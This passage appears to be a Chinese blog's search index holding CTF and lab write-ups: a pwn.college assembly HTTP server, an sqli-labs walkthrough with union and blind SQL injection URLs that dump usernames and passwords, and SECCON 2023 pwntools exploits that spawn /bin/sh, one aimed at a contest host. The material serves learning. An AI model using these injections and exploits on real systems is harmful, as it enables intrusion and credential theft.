class="line"></span><br><span class="line">    mov rax,0x3</span><br><span class="line">    syscall         #close(3) = 0</span><br><span class="line"></span><br><span class="line">    lea rsi,message</span><br><span class="line">    mov rdx,message_len</span><br><span class="line">    mov rdi,r12</span><br><span class="line">    mov rax,0x1     #write(4, &quot;HTTP/1.0 200 OK\r\n\r\n&quot;, 19) = 19</span><br><span class="line">    syscall</span><br><span class="line">    </span><br><span class="line">    lea rsi,read_buf</span><br><span class="line">    mov rdx,r13</span><br><span class="line">    mov rax,0x1     #write(4, &lt;write_file&gt;, &lt;write_file_count&gt;) = &lt;write_file_result&gt;</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">Exit:</span><br><span class="line">    mov rdi, 0</span><br><span class="line">    mov rax, 60     #exit(0) = ?</span><br><span class="line">    syscall</span><br><span class="line">    </span><br></pre></td></tr></table></figure>

<h1 id="level11-Responds-multiple-POST-Multi-processed-program"><a href="#level11-Responds-multiple-POST-Multi-processed-program" class="headerlink" title="level11 Responds(multiple,POST,Multi-processed program)"></a>level11 Responds(multiple,POST,Multi-processed program)</h1><p>本关要求动态响应GET和POST的</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">In this challenge you will respond to multiple concurrent GET and POST requests.</span><br></pre></td></tr></table></figure>

<p>我level10的程序已经可以分别对POST和GET进行处理，并不断循环accept，可以通过考验</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.intel_syntax noprefix</span><br><span class="line">.globl _start</span><br><span class="line"></span><br><span class="line">.section .data</span><br><span class="line">    sockaddr_in:</span><br><span class="line">    .word 2              # sa_family = AF_INET</span><br><span class="line">    .word 0x5000         # sin_port = htons(80)</span><br><span class="line">    .long 0              # sin_addr = 0.0.0.0</span><br><span class="line"></span><br><span class="line">    message:    </span><br><span class="line">        .ascii &quot;HTTP/1.0 200 OK\r\n\r\n&quot;</span><br><span class="line">    message_len = . - message</span><br><span class="line">    filename:</span><br><span class="line">        .asciz &quot;/tmp/build&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">.section .bss</span><br><span class="line">    read_buf: .space 1024    # 预留1024字节的空间用于读取数据</span><br><span class="line">    file_buf: .space 1024</span><br><span class="line"></span><br><span class="line">.section .text</span><br><span class="line">_start:</span><br><span class="line">    mov rax,0x29   #socket(AF_INET, SOCK_STREAM, IPPROTO_IP) = 3</span><br><span class="line">	mov rdi,2</span><br><span class="line">	mov rsi,1</span><br><span class="line">	mov rdx,0</span><br><span class="line">	syscall</span><br><span class="line">	mov r10,rax    # r10=套接字描述符</span><br><span class="line">    </span><br><span class="line">    lea rsi,sockaddr_in </span><br><span class="line">    mov rdi,r10</span><br><span class="line">    mov rdx,16</span><br><span class="line">    mov rax,0x31    #bind(3, &#123;sa_family=AF_INET, sin_port=htons(&lt;bind_port&gt;), sin_addr=inet_addr(&quot;&lt;bind_address&gt;&quot;)&#125;, 16) = 0</span><br><span class="line">    syscall         </span><br><span class="line"></span><br><span class="line">    mov rdi,r10</span><br><span class="line">    mov rsi,0</span><br><span class="line">    mov rax,0x32    #listen(3, 0) = 0</span><br><span class="line">    syscall       </span><br><span class="line"></span><br><span class="line">Accept:</span><br><span class="line">    mov rdi,r10</span><br><span class="line">    xor rsi,rsi</span><br><span class="line">    xor rdx,rdx</span><br><span class="line">    mov rax,0x2b    #accept(3, NULL, NULL) = 4</span><br><span class="line">    syscall</span><br><span class="line">    mov r12,rax</span><br><span class="line">    </span><br><span class="line">    cmp r12,0</span><br><span class="line">    jb Exit</span><br><span class="line">    </span><br><span class="line">    mov rax,0x39</span><br><span class="line">    syscall         #fork() = &lt;fork_result&gt;</span><br><span class="line"></span><br><span class="line">    cmp rax,0</span><br><span class="line">    jz Respond</span><br><span class="line"></span><br><span class="line">Close_Accept:</span><br><span class="line">    mov rdi,r12</span><br><span class="line">    mov rax,0x3     </span><br><span class="line">    syscall         #close(4) = 0</span><br><span class="line"></span><br><span class="line">    jmp Accept</span><br><span class="line"></span><br><span class="line">Respond:</span><br><span class="line"></span><br><span class="line">    mov rdi,r10</span><br><span class="line">    mov rax,0x3</span><br><span class="line">    syscall         #close(3) = 0</span><br><span class="line"></span><br><span class="line">    lea rsi,read_buf</span><br><span class="line">    mov rdx,1024</span><br><span class="line">    mov rdi,r12</span><br><span class="line">    mov rax,0x0     #read(4, &lt;read_request&gt;, &lt;read_request_count&gt;) = &lt;read_request_result&gt;</span><br><span class="line">    syscall </span><br><span class="line">    mov r9,rax</span><br><span class="line"></span><br><span class="line">    mov al,[read_buf]</span><br><span class="line">    cmp al,&#x27;G&#x27;</span><br><span class="line">    je GET</span><br><span class="line"></span><br><span class="line">    cmp al,&#x27;P&#x27;</span><br><span class="line">    je POST</span><br><span class="line"></span><br><span class="line">    jmp Exit</span><br><span class="line"></span><br><span class="line">POST:</span><br><span class="line">extract_post_body:</span><br><span class="line">    lea rsi, read_buf          # 获取请求字符串</span><br><span class="line">    add rsi, 5                  # 跳过 &#x27;POST &#x27;</span><br><span class="line"></span><br><span class="line">    # 查找请求体的起始位置</span><br><span class="line">    xor rcx, rcx               # 清零 rcx，用于计数</span><br><span class="line">.find_double_newline:</span><br><span class="line">    cmpb byte [rsi], 0          # 检查字符串结束</span><br><span class="line">    je .done                     # 如果到达结束，跳转到完成</span><br><span class="line"></span><br><span class="line">    cmpb byte [rsi], 10         # 检查是否为换行符 &#x27;\n&#x27;</span><br><span class="line">    je .check_previous           # 如果找到换行符，检查前一个字符</span><br><span class="line"></span><br><span class="line">    inc rsi                      # 移动到下一个字符</span><br><span class="line">    jmp .find_double_newline</span><br><span class="line"></span><br><span class="line">.check_previous:</span><br><span class="line">    cmpb byte [rsi - 1], 13      # 检查前一个字符是否为回车符 &#x27;\r&#x27;</span><br><span class="line">    je .cmp_more      # 如果找到 &#x27;\r\n&#x27;，跳转</span><br><span class="line"></span><br><span class="line">    inc rsi                      # 移动到下一个字符</span><br><span class="line">    jmp .find_double_newline</span><br><span class="line"></span><br><span class="line">.cmp_more:</span><br><span class="line">    cmpb byte [rsi-2],10</span><br><span class="line">    je .found_double_newline</span><br><span class="line"></span><br><span class="line">    inc rsi</span><br><span class="line">    jmp .find_double_newline</span><br><span class="line">.found_double_newline:</span><br><span class="line">    inc rsi                     # 跳过换行符</span><br><span class="line">    inc rsi</span><br><span class="line">    mov r15, rsi                # r15 现在指向请求体的开始</span><br><span class="line">    jmp .done</span><br><span class="line"></span><br><span class="line">.done:</span><br><span class="line">    # 现在 r15 指向请求体的开始</span><br><span class="line">    # 使用 r9 存储请求体的长度</span><br><span class="line">    lea rax, [read_buf + r9]   # 假设请求体最大长度为 256</span><br><span class="line">    sub rax, r15                 # 计算请求体的长度</span><br><span class="line">    mov r9, rax                  # 将长度存储到 r9 中</span><br><span class="line"></span><br><span class="line">    lea rsi, read_buf       #获取文件名</span><br><span class="line">    add rsi, 5              # 跳过 &#x27;POST &#x27;</span><br><span class="line">    mov rdi, rsi            # rdi 现在指向文件名</span><br><span class="line"></span><br><span class="line">    xor rcx,rcx             # 文件名长度计数器</span><br><span class="line">    # 找到下一个空格并替换为 null 以终止字符串</span><br><span class="line">    .find_space_P:</span><br><span class="line">        cmpb byte [rsi], &#x27; &#x27;  # 检查是否为下一个空格</span><br><span class="line">        je .found_space_P</span><br><span class="line">        inc rsi</span><br><span class="line">        inc rcx</span><br><span class="line">        jmp .find_space_P</span><br><span class="line">    .found_space_P:</span><br><span class="line">        movb byte [rsi], 0    # 替换为空字符以终止字符串</span><br><span class="line">    mov r13,rcx</span><br><span class="line">    </span><br><span class="line">    mov rsi,0x01 | 0x40</span><br><span class="line">    mov rdx,0777</span><br><span class="line">    mov rax,0x2     #open(&quot;&lt;open_path&gt;&quot;, O_RDONLY) = 3</span><br><span class="line">    syscall</span><br><span class="line">    mov r11,rax</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    mov rsi,r15</span><br><span class="line">    mov rdx,r9</span><br><span class="line">    mov rdi,r11</span><br><span class="line">    mov rax,0x1</span><br><span class="line">    syscall         #write(3, &lt;write_file&gt;, &lt;write_file_count&gt;) = &lt;write_file_result&gt;</span><br><span class="line"></span><br><span class="line">    mov rax,0x3</span><br><span class="line">    syscall         #close(3) = 0</span><br><span class="line"></span><br><span class="line">    lea rsi,message</span><br><span class="line">    mov rdx,message_len</span><br><span class="line">    mov rdi,r12</span><br><span class="line">    mov rax,0x1     #write(4, &quot;HTTP/1.0 200 OK\r\n\r\n&quot;, 19) = 19</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    jmp Exit</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">GET:</span><br><span class="line">    lea rsi, read_buf </span><br><span class="line">    add rsi, 4              # 跳过 &#x27;GET &#x27;</span><br><span class="line">    mov rdi, rsi            # rdi 现在指向文件名</span><br><span class="line">    # 找到下一个空格并替换为 null 以终止字符串</span><br><span class="line">    .find_space:</span><br><span class="line">        cmpb byte [rsi], &#x27; &#x27;  # 检查是否为下一个空格</span><br><span class="line">        je .found_space</span><br><span class="line">        inc rsi</span><br><span class="line">        jmp .find_space</span><br><span class="line"></span><br><span class="line">    .found_space:</span><br><span class="line">        movb byte [rsi], 0    # 替换为空字符以终止字符串</span><br><span class="line">    </span><br><span class="line">    mov rsi,0</span><br><span class="line">    mov rax,0x2     #open(&quot;&lt;open_path&gt;&quot;, O_RDONLY) = 3</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    mov rdi,rax</span><br><span class="line">    lea rsi,read_buf</span><br><span class="line">    mov rdx,1024</span><br><span class="line">    mov rax,0x0</span><br><span class="line">    syscall         #read(3, &lt;read_file&gt;, &lt;read_file_count&gt;) = &lt;read_file_result&gt;</span><br><span class="line">    mov r13,rax</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    mov rax,0x3</span><br><span class="line">    syscall         #close(3) = 0</span><br><span class="line"></span><br><span class="line">    lea rsi,message</span><br><span class="line">    mov rdx,message_len</span><br><span class="line">    mov rdi,r12</span><br><span class="line">    mov rax,0x1     #write(4, &quot;HTTP/1.0 200 OK\r\n\r\n&quot;, 19) = 19</span><br><span class="line">    syscall</span><br><span class="line">    </span><br><span class="line">    lea rsi,read_buf</span><br><span class="line">    mov rdx,r13</span><br><span class="line">    mov rax,0x1     #write(4, &lt;write_file&gt;, &lt;write_file_count&gt;) = &lt;write_file_result&gt;</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">Exit:</span><br><span class="line">    mov rdi, 0</span><br><span class="line">    mov rax, 60     #exit(0) = ?</span><br><span class="line">    syscall</span><br><span class="line">    </span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>pwn</tag>
        <tag>pwn-college</tag>
      </tags>
  </entry>
  <entry>
    <title>sqli-labs</title>
    <url>/2023/09/18/sqli-labs/</url>
    <content><![CDATA[<h1 id="less-1"><a href="#less-1" class="headerlink" title="less-1"></a>less-1</h1><p> tips: 可以在第21行加入</p>
<p><code>echo &quot;有效输入:&quot;.$id.&quot;&lt;br&gt;&quot;;</code></p>
<p>第32行加入</p>
<p><code>echo &quot;执行的sql语句:&quot;.$sql.&quot;&lt;br&gt;&quot;;</code></p>
<p><img src="/2023/09/18/sqli-labs/Snipaste_2023-09-18_22-43-25.png"></p>
<p>可以帮助学习</p>
<p>注释tip：<code>#</code>需要用<code>%23</code>才可以正常注释</p>
<h2 id="判断注入类型"><a href="#判断注入类型" class="headerlink" title="判断注入类型"></a>判断注入类型</h2><p><code>http://127.0.0.1/Less-1/?id=1&#39;</code></p>
<p>如果是单引号型，就会报错为</p>
<p>**You have an error  in your SQL syntax; check the manual that corresponds to your MySQL  server version for the right syntax to use near ‘’1’’ LIMIT 0,1’ at line 1 **</p>
<p>如果是双引号型，就不会报错</p>
<p>如果是数字型，输入非数字就会报错，同时，用单引号和双引号判断时，报错结果不会有数字</p>
<p><img src="/2023/09/18/sqli-labs/Snipaste_2023-09-18_22-52-00.png"></p>
<p>判断该题为单引号型</p>
<p><code>http://127.0.0.1/Less-1/?id=1&#39; order by 4; -- +</code>的结果为<code>Unknown column &#39;4&#39; in &#39;order clause&#39; </code></p>
<p>而order by 3的结果是正常，则表明有3列</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">order by n   # n为数字</span><br><span class="line">#以第n列为标准来升序排序</span><br></pre></td></tr></table></figure>

<p><code>http://127.0.0.1/Less-1/?id=-1&#39; union select 1,2,3; %23 </code>判断可见输出是哪些列</p>
<p>sql语句中需要用union连接两个语句</p>
<h2 id="爆当前数据库名"><a href="#爆当前数据库名" class="headerlink" title="爆当前数据库名"></a>爆当前数据库名</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/Less-1/?id=-1&#x27; union select 1,database(),version() -- +</span><br><span class="line">执行的sql语句:SELECT * FROM users WHERE id=&#x27;-1&#x27; union select 1,database(),version() -- &#x27; LIMIT 0,1</span><br><span class="line">输出结果如下：</span><br><span class="line">	Your Login name:security</span><br><span class="line">	Your Password:5.7.26</span><br></pre></td></tr></table></figure>

<p>可知库名为security</p>
<h2 id="注入常见参数"><a href="#注入常见参数" class="headerlink" title="注入常见参数"></a>注入常见参数</h2><ul>
<li><code>user()</code>：当前数据库用户</li>
<li><code>database()</code>：当前数据库名</li>
<li><code>version()</code>：当前使用的数据库版本</li>
<li><code>@@datadir</code>：数据库存储数据路径</li>
<li><code>concat()</code>：联合数据，用于联合两条数据结果。如 <code>concat(username,0x3a,password)</code></li>
<li><code>()</code>：和 <code>concat()</code> 类似，如 <code>group_concat(DISTINCT+user,0x3a,password)</code>，用于把多条数据一次注入出来</li>
<li><code>concat_ws()</code>：用法类似</li>
<li><code>hex()</code> 和 <code>unhex()</code>：用于 hex 编码解码</li>
<li><code>load_file()</code>：以文本方式读取文件，在 Windows 中，路径设置为 <code>\\</code></li>
<li><code>select xxoo into outfile &#39;路径&#39;</code>：权限较高时可直接写文件</li>
</ul>
<h2 id="爆表名"><a href="#爆表名" class="headerlink" title="爆表名"></a>爆表名</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/Less-1/?id=-1&#x27; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&quot;security&quot; -- +</span><br><span class="line">执行的sql语句:SELECT * FROM users WHERE id=&#x27;-1&#x27; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&quot;security&quot; -- &#x27; LIMIT 0,1</span><br><span class="line">输出结果如下：</span><br><span class="line">	Your Login name:emails,referers,uagents,users</span><br></pre></td></tr></table></figure>

<p><img src="/2023/09/18/sqli-labs/Snipaste_2023-09-18_23-36-10.png"></p>
<p>可以看到<strong>information_schema.tables</strong>的信息</p>
<h2 id="爆列名"><a href="#爆列名" class="headerlink" title="爆列名"></a>爆列名</h2><p><img src="/2023/09/18/sqli-labs/Snipaste_2023-09-18_23-41-45.png"></p>
<p>可以看到<strong>information_schema.columns</strong>的信息</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/Less-1/?id=-1&#x27; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&quot;users&quot; -- +</span><br><span class="line">执行的sql语句:SELECT * FROM users WHERE id=&#x27;-1&#x27; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&quot;users&quot; -- &#x27; LIMIT 0,1</span><br><span class="line">输出结果如下：</span><br><span class="line">	Your Password:USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS,id,username,password </span><br></pre></td></tr></table></figure>

<p>可以看到爆出了username和password</p>
<h2 id="爆值"><a href="#爆值" class="headerlink" title="爆值"></a>爆值</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/Less-1/?id=0&#x27; union select 1,2,group_concat(password,&quot;:&quot;,username) from users -- +</span><br><span class="line">#用group_concat合并同一列的全部数据</span><br><span class="line">执行的sql语句:SELECT * FROM users WHERE id=&#x27;0&#x27; union select 1,2,group_concat(password,&quot;:&quot;,username) from users -- &#x27; LIMIT 0,1</span><br><span class="line">Your Password:Dumb:Dumb,I-kill-you:Angelina,p@ssword:Dummy,crappy:secure,stupidity:stupid,genious:superman,mob!le:batman,admin:admin,admin1:admin1,admin2:admin2,admin3:admin3,dumbo:dhakkan,admin4:admin4 </span><br></pre></td></tr></table></figure>

<h1 id="less-2"><a href="#less-2" class="headerlink" title="less-2"></a>less-2</h1><p>判断为数字型注入</p>
<p><img src="/2023/09/18/sqli-labs/Snipaste_2023-10-05_21-15-08.png"></p>
<h2 id="爆数据库名"><a href="#爆数据库名" class="headerlink" title="爆数据库名"></a>爆数据库名</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/Less-2/?id=0 union select 1,database(),version() -- +</span><br></pre></td></tr></table></figure>

<p><img src="/2023/09/18/sqli-labs/Snipaste_2023-10-05_21-16-07.png"></p>
<h2 id="爆表名-1"><a href="#爆表名-1" class="headerlink" title="爆表名"></a>爆表名</h2><p><img src="/2023/09/18/sqli-labs/Snipaste_2023-10-05_21-20-39.png"></p>
<p>之后步骤也和less-1一样</p>
<h1 id="less-3"><a href="#less-3" class="headerlink" title="less-3"></a>less-3</h1><p>通过看后台源代码可以发现，</p>
<p><img src="/2023/09/18/sqli-labs/Snipaste_2023-10-05_21-26-45.png"></p>
<p>与less-1的区别在于有括号，在比赛中往往不能看到源码，所以要对括号闭合进行测试</p>
<p>其余与less-1一样</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/Less-3/?id=0&#x27;) union select 1,2,3 -- +</span><br></pre></td></tr></table></figure>

<h1 id="less-4"><a href="#less-4" class="headerlink" title="less-4"></a>less-4</h1><p>双引号且括号闭合，与less-1一样</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/Less-4/?id=0&quot;) union select 1,2,3 -- +</span><br></pre></td></tr></table></figure>

<h1 id="less-5"><a href="#less-5" class="headerlink" title="less-5"></a>less-5</h1><p>本题是单引号字符型，但没有回显，所以联合注入就没用了，应当使用布尔盲注</p>
<h2 id="布尔注入"><a href="#布尔注入" class="headerlink" title="布尔注入"></a>布尔注入</h2><p>主要用到三个函数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">length函数，用来判断数据库长度</span><br><span class="line">ascii函数，用来判断字符的ascii值，也就是确认字符</span><br><span class="line">substr函数，用来截取字符串。有三个参数，从左到右分别是，要操作的字符串，起始位置，截取长度</span><br></pre></td></tr></table></figure>

<p>具体用法</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/Less-5/?id=1&#x27; and length((select database()))&gt;5 -- +</span><br><span class="line">判断数据库名长度是否大于5</span><br><span class="line">http://127.0.0.1/Less-5/?id=1&#x27; and ascii(substr((select database()),1,1))=115 -- +</span><br><span class="line">判断数据库第一个单词是不是小写字母&quot;s&quot;</span><br></pre></td></tr></table></figure>

<p>按照联合注入，应该是</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select group_concat(table_name) from information_schema.tables where table_schema=database())</span><br></pre></td></tr></table></figure>

<p>但是到了盲注这里就变成</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">length((select group_concat(table_name) from information_schema.tables where table_schema=database())))&gt;13 -- +</span><br><span class="line">判断全部表名长度</span><br></pre></td></tr></table></figure>

<p>然后依次判断表名字符</p>
<p>到这里，工作量已经非常巨大了</p>
<p>之后还要判断列名，还要判断值，所以不如使用自动化工具 <strong>sqlmap</strong></p>
<h1 id="less-6"><a href="#less-6" class="headerlink" title="less-6"></a>less-6</h1>]]></content>
      <tags>
        <tag>web</tag>
        <tag>sql</tag>
      </tags>
  </entry>
  <entry>
    <title>seccon-quals-2023</title>
    <url>/2023/09/19/seccon-quals-2023/</url>
    <content><![CDATA[<h1 id="rop-2-35"><a href="#rop-2-35" class="headerlink" title="rop-2.35"></a>rop-2.35</h1><p><img src="/2023/09/19/seccon-quals-2023/Snipaste_2023-09-19_21-08-01.png"></p>
<p>任意溢出，需要自己构造<code>/bin/sh\x00</code>字符，造成溢出调用gets，往某一数据段写入<code>/bin/sh\x00</code>，gets的返回值是指向这个缓冲区的指针，再使用gadget   <code>mov rdi,rax;call system</code>即可</p>
<p>payload</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">r=process(&quot;./pwn&quot;)</span><br><span class="line">elf=process(&quot;./pwn&quot;)</span><br><span class="line">system=elf.sym[&quot;system&quot;]</span><br><span class="line">gets_plt=elf.plt[&quot;gets&quot;]</span><br><span class="line">ret=0x000000000040101a</span><br><span class="line">payload=b&quot;A&quot;*0x18+p64(gets_plt)+p64(ret)+p64(0x401169)</span><br><span class="line">r.sendline(&quot;/bin/sh\x00&quot;)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>

<h1 id="selfcet"><a href="#selfcet" class="headerlink" title="selfcet"></a>selfcet</h1><p>预期解是</p>
<p><code>Selfcet: 使用 arch _ prctl 重写 fs 寄存器以避免 stack canary</code>,劫持tls绕过canary</p>
<p>看其他师傅的wp，用了一种非预期，利用signal函数，设置程序异常中止时要调用的函数，再触发stack_chk_fail,称为ssp自杀</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#源码</span><br><span class="line">#include &lt;err.h&gt;</span><br><span class="line">#include &lt;stdint.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">#include &lt;stddef.h&gt;</span><br><span class="line"></span><br><span class="line">#define INSN_ENDBR64 (0xF30F1EFA) /* endbr64 */</span><br><span class="line">#define CFI(f)                                              \</span><br><span class="line">  (&#123;                                                        \</span><br><span class="line">    if (__builtin_bswap32(*(uint32_t*)(f)) != INSN_ENDBR64) \</span><br><span class="line">      __builtin_trap();                                     \</span><br><span class="line">    (f);                                                    \</span><br><span class="line">  &#125;)</span><br><span class="line"></span><br><span class="line">#define KEY_SIZE 0x20</span><br><span class="line">typedef struct &#123;</span><br><span class="line">  char key[KEY_SIZE];</span><br><span class="line">  char buf[KEY_SIZE];</span><br><span class="line">  const char *error;</span><br><span class="line">  int status;</span><br><span class="line">  void (*throw)(int, const char*, ...);</span><br><span class="line">&#125; ctx_t;</span><br><span class="line"></span><br><span class="line">void read_member(ctx_t *ctx, off_t offset, size_t size) &#123;</span><br><span class="line">  if (read(STDIN_FILENO, (void*)ctx + offset, size) &lt;= 0) &#123;</span><br><span class="line">    ctx-&gt;status = EXIT_FAILURE;</span><br><span class="line">    ctx-&gt;error = &quot;I/O Error&quot;;</span><br><span class="line">  &#125;</span><br><span class="line">  ctx-&gt;buf[strcspn(ctx-&gt;buf, &quot;\n&quot;)] = &#x27;\0&#x27;;</span><br><span class="line"></span><br><span class="line">  if (ctx-&gt;status != 0)</span><br><span class="line">    CFI(ctx-&gt;throw)(ctx-&gt;status, ctx-&gt;error);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void encrypt(ctx_t *ctx) &#123;</span><br><span class="line">  for (size_t i = 0; i &lt; KEY_SIZE; i++)</span><br><span class="line">    ctx-&gt;buf[i] ^= ctx-&gt;key[i];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main() &#123;</span><br><span class="line">  ctx_t ctx = &#123; .error = NULL, .status = 0, .throw = err &#125;;</span><br><span class="line"></span><br><span class="line">  read_member(&amp;ctx, offsetof(ctx_t, key), sizeof(ctx));</span><br><span class="line">  read_member(&amp;ctx, offsetof(ctx_t, buf), sizeof(ctx));</span><br><span class="line"></span><br><span class="line">  encrypt(&amp;ctx);</span><br><span class="line">  write(STDOUT_FILENO, ctx.buf, KEY_SIZE);</span><br><span class="line"></span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>两次read大小都是0x58，每一次read后都会检测是否覆写了status，如果是，就会执行err函数</p>
<p>但是可以覆写err函数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nm -CD /root/glibc-all-in-one/libs/2.35-0ubuntu3_amd64/libc.so.6 | sort | grep -w err -C 4</span><br><span class="line">0000000000121010 T warn@@GLIBC_2.2.5</span><br><span class="line">00000000001210d0 T warnx@@GLIBC_2.2.5</span><br><span class="line">0000000000121190 T verr@@GLIBC_2.2.5</span><br><span class="line">00000000001211b0 T verrx@@GLIBC_2.2.5</span><br><span class="line">00000000001211d0 T err@@GLIBC_2.2.5</span><br><span class="line">0000000000121270 T errx@@GLIBC_2.2.5</span><br><span class="line">00000000001214e0 W error@@GLIBC_2.2.5</span><br><span class="line">0000000000121700 W error_at_line@@GLIBC_2.2.5</span><br><span class="line">00000000001217b0 T ustat@GLIBC_2.2.5</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>查看err函数附近的函数，康康哪些可以低位覆写，可以覆写warnx函数，warnx也会接收两个参数，并且会输出，（远程中要用0x0010）实现泄露，再通过修改err函数，调用各种函数</p>
<p>payload</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context(arch=&quot;amd64&quot;,os=&quot;linux&quot;,log_level=&quot;debug&quot;)</span><br><span class="line"></span><br><span class="line">libc=ELF(&quot;/root/glibc-all-in-one/libs/2.35-0ubuntu3_amd64/libc.so.6&quot;)</span><br><span class="line">for i in range(16):</span><br><span class="line"></span><br><span class="line">  #通过覆写err为warn函数，可以实现泄露</span><br><span class="line">  warn_=0x0010+0x1000*i</span><br><span class="line">  print(f&quot;trying: &#123;warn_:x&#125;&quot;)</span><br><span class="line"></span><br><span class="line">  #r = process(&quot;./pwn&quot;)</span><br><span class="line">  r = remote(&quot;selfcet.seccon.games&quot;, 9999)</span><br><span class="line"></span><br><span class="line">  elf = ELF(&quot;./pwn&quot;)</span><br><span class="line"></span><br><span class="line">  payload=b&quot;a&quot;*0x20</span><br><span class="line">  payload+=b&quot;a&quot;*0x20</span><br><span class="line">  payload+=p64(0x404000)</span><br><span class="line">  payload+=p64(elf.got[&quot;read&quot;])</span><br><span class="line">  payload+=p16(warn_)</span><br><span class="line"></span><br><span class="line">  r.send(payload)</span><br><span class="line">  try:</span><br><span class="line">    print(r.recvuntil(b&quot;xor: &quot;))</span><br><span class="line">  except EOFError:</span><br><span class="line">    r.close()</span><br><span class="line">    continue</span><br><span class="line">  break</span><br><span class="line">read_addr=u64(r.recv(6).ljust(8,b&quot;\x00&quot;))</span><br><span class="line">print(&quot;read---&gt;&quot;+hex(read_addr))</span><br><span class="line">lb=read_addr-libc.sym[&quot;read&quot;]</span><br><span class="line">#print(&quot;lb--&gt;&quot;+hex(lb))</span><br><span class="line">system=lb+libc.symbols[&quot;system&quot;]</span><br><span class="line">gets=lb+libc.symbols[&quot;gets&quot;]</span><br><span class="line">signal  = lb + libc.symbols[&quot;signal&quot;]</span><br><span class="line"></span><br><span class="line">payload2=b&quot;a&quot;*0x20</span><br><span class="line">payload2+=p64(0x401209)</span><br><span class="line">payload2+=p64(0x6)</span><br><span class="line">payload2 += p64(signal)</span><br><span class="line">payload2 += b&quot;A&quot; * 0x20 #overflow</span><br><span class="line"></span><br><span class="line">r.send(payload2)</span><br><span class="line"></span><br><span class="line">payload3=b&quot;a&quot;*0x20</span><br><span class="line">payload3+=b&quot;a&quot;*0x20</span><br><span class="line">payload3+=p64(0)</span><br><span class="line">payload3+=p64(0x404500)</span><br><span class="line">payload3+=p64(gets)</span><br><span class="line"></span><br><span class="line">r.send(payload3)</span><br><span class="line"></span><br><span class="line">r.sendline(&quot;/bin/sh\0&quot;)</span><br><span class="line">sleep(5)</span><br><span class="line">payload4=b&quot;a&quot;*0x20</span><br><span class="line">payload4+=p64(0)</span><br><span class="line">payload4+=p64(0x404500)</span><br><span class="line">payload4+=p64(system)</span><br><span class="line"></span><br><span class="line">r.send(payload4)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>

<p>参考</p>
<p><a href="https://ngkz.github.io/2023/09/seccon-2023-quals-writeup/">SECCON 2023 Quals Writeup (ngkz.github.io)</a></p>
<p><a href="https://kileak.github.io/ctf/2023/secconquals23-selfcet/">SECCON CTF 2023 Quals - selfcet | kileak</a></p>
]]></content>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
</search>
